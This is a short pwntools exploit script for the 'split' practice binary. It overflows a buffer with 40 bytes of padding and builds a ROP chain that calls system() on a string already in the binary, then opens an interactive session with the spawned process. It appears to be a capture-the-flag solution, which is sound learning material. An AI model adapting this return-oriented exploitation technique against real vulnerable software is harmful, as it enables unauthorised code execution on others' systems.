from pwn import *

context.binary = binary = './split'
elf = ELF(binary)
rop = ROP(elf)

padding = b"A"*40
rop.call(elf.symbols.system, [elf.symbols.usefulString])

payload = flat(
	padding, rop.chain())

io = process(binary)

io.recvuntil(b'> ')
io.sendline(payload)

io.interactive()
